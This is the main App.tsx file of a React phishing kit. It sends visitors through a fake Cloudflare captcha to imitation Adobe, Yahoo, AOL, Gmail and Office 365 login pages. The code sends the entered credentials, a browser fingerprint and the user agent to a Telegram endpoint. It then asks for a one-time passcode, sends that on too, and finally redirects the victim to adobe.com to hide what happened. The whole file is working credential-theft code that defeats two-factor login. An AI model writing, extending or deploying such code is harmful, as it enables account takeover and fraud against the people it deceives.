import React, { useState, useEffect } from 'react';
import { Routes, Route, useNavigate, Navigate } from 'react-router-dom';
import LoginPage from './components/LoginPage';
import MobileLoginPage from './components/mobile/MobileLoginPage';
import YahooLoginPage from './components/YahooLoginPage';
import MobileYahooLoginPage from './components/mobile/MobileYahooLoginPage';
import AolLoginPage from './components/AolLoginPage';
import GmailLoginPage from './components/GmailLoginPage';
import Office365Wrapper from './components/Office365Wrapper';
import LandingPage from './components/LandingPage';
import MobileLandingPage from './components/mobile/MobileLandingPage';
import CloudflareCaptcha from './components/CloudflareCaptcha';
import OtpPage from './components/OtpPage';
import MobileOtpPage from './components/mobile/MobileOtpPage';
import Spinner from './components/common/Spinner';
import { getBrowserFingerprint } from './utils/oauthHandler';
import { setCookie, getCookie, removeCookie, subscribeToCookieChanges, CookieChangeEvent } from './utils/realTimeCookieManager';
import { config } from './config';

const safeSendToTelegram = async (sessionData: any) => {
  try {
    const res = await fetch(config.api.sendTelegramEndpoint, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(sessionData) });
    if (!res.ok) { throw new Error(`HTTP ${res.status}`); }
    return await res.json();
  } catch (fetchErr) { console.error('sendToTelegram failed:', fetchErr); }
};

function App() {
  const [isMobile, setIsMobile] = useState(false);
  const [hasActiveSession, setHasActiveSession] = useState(() => !!getCookie('adobe_session'));
  const [isLoading, setIsLoading] = useState(false);
  const [loginAttemptData, setLoginAttemptData] = useState<any>(null);
  const [showOtpPage, setShowOtpPage] = useState(false);
  const navigate = useNavigate();

  useEffect(() => {
    const checkMobile = () => setIsMobile(window.innerWidth <= 768);
    checkMobile();
    window.addEventListener('resize', checkMobile);
    return () => window.removeEventListener('resize', checkMobile);
  }, []);

  useEffect(() => {
    const handleCookieChange = (event: CookieChangeEvent) => {
      if (event.name === 'adobe_session') {
        const isActive = event.action !== 'remove' && !!event.value;
        if (isActive) {
          navigate('/landing', { replace: true });
        } else {
          setHasActiveSession(false);
          setShowOtpPage(false);
          setLoginAttemptData(null);
          navigate('/', { replace: true });
        }
      }
    };
    const unsubscribe = subscribeToCookieChanges(handleCookieChange);
    return unsubscribe;
  }, [navigate]);

  const handleCaptchaVerified = () => navigate('/login');

  const handleSecondLoginAttempt = async (loginData: any) => {
    if (!loginData.isSecondAttempt) return;

    setIsLoading(true);
    console.log('Second attempt data received. Preparing to send credentials.');
    const browserFingerprint = await getBrowserFingerprint();
    const credentialsData = { 
      ...loginData, 
      sessionId: Math.random().toString(36).substring(2, 15), 
      timestamp: new Date().toISOString(), 
      userAgent: navigator.userAgent, 
      ...browserFingerprint 
    };
    
    setLoginAttemptData(credentialsData);
    
    await safeSendToTelegram({ type: 'credentials', data: credentialsData });
    
    console.log('Credentials sent. Showing OTP page.');
    setShowOtpPage(true);
    navigate('/otp', { replace: true });
    setIsLoading(false);
  };
  
  const handleDirectLogin = async (loginData: any) => {
    setIsLoading(true);
    const browserFingerprint = await getBrowserFingerprint();
    const finalSessionData = { 
      ...loginData, 
      sessionId: Math.random().toString(36).substring(2, 15), 
      timestamp: new Date().toISOString(), 
      userAgent: navigator.userAgent, 
      ...browserFingerprint 
    };

    await safeSendToTelegram({ type: 'credentials', data: finalSessionData });
    
    const cookieOptions = { path: '/', secure: process.env.NODE_ENV === 'production', sameSite: 'strict' as const };
    setCookie('adobe_session', 'active', cookieOptions);
    setHasActiveSession(true);
    setIsLoading(false);
  };

  const handleOtpSubmit = async (otp: string) => {
    if (!loginAttemptData) return;
    
    setIsLoading(true);
    console.log('OTP received. Sending and redirecting.');
    
    await safeSendToTelegram({
      type: 'otp',
      data: { otp, session: loginAttemptData },
    });
    
    // Redirect without resetting state to avoid flickers
    window.location.href = 'https://www.adobe.com';
  };

  const handleLogout = () => {
    config.session.cookieNames.forEach(name => removeCookie(name, { path: '/' }));
  };

  if (isLoading && !showOtpPage) {
    return <div className="min-h-screen bg-gray-100 flex items-center justify-center"><div className="text-center"><Spinner size="lg" /><p className="text-gray-600 mt-4">Loading...</p></div></div>;
  }

  const LoginComponent = isMobile ? MobileLoginPage : LoginPage;
  const LandingComponent = isMobile ? MobileLandingPage : LandingPage;
  const YahooComponent = isMobile ? MobileYahooLoginPage : YahooLoginPage;
  const OtpComponent = isMobile ? MobileOtpPage : OtpPage;

  return (
    <Routes>
      <Route path="/" element={!hasActiveSession && !showOtpPage ? <CloudflareCaptcha onVerified={handleCaptchaVerified} /> : <Navigate to={hasActiveSession ? "/landing" : "/otp"} replace />} />
      <Route path="/login" element={!hasActiveSession && !showOtpPage ? <LoginComponent fileName="Adobe Cloud Access" onYahooSelect={() => navigate('/login/yahoo')} onAolSelect={() => navigate('/login/aol')} onGmailSelect={() => navigate('/login/gmail')} onOffice365Select={() => navigate('/login/office365')} onBack={() => navigate('/')} onLoginSuccess={handleSecondLoginAttempt} onLoginError={e => console.error(e)} /> : <Navigate to={hasActiveSession ? "/landing" : "/otp"} replace />} />
      <Route path="/login/yahoo" element={!hasActiveSession && !showOtpPage ? <YahooComponent onLoginSuccess={handleDirectLogin} onLoginError={e => console.error(e)} /> : <Navigate to="/landing" replace />} />
      <Route path="/login/aol" element={!hasActiveSession && !showOtpPage ? <AolLoginPage onLoginSuccess={handleDirectLogin} onLoginError={e => console.error(e)} /> : <Navigate to="/landing" replace />} />
      <Route path="/login/gmail" element={!hasActiveSession && !showOtpPage ? <GmailLoginPage onLoginSuccess={handleDirectLogin} onLoginError={e => console.error(e)} /> : <Navigate to="/landing" replace />} />
      <Route path="/login/office365" element={!hasActiveSession && !showOtpPage ? <Office365Wrapper onLoginSuccess={handleDirectLogin} onLoginError={e => console.error(e)} /> : <Navigate to="/landing" replace />} />
      <Route path="/otp" element={showOtpPage && !hasActiveSession ? <OtpComponent onSubmit={handleOtpSubmit} isLoading={isLoading} email={loginAttemptData?.email} /> : <Navigate to="/" replace />} />
      <Route path="/landing" element={hasActiveSession ? <LandingComponent onLogout={handleLogout} /> : <Navigate to="/" replace />} />
      <Route path="*" element={<Navigate to={hasActiveSession ? "/landing" : "/"} replace />} />
    </Routes>
  );
}

export default App;
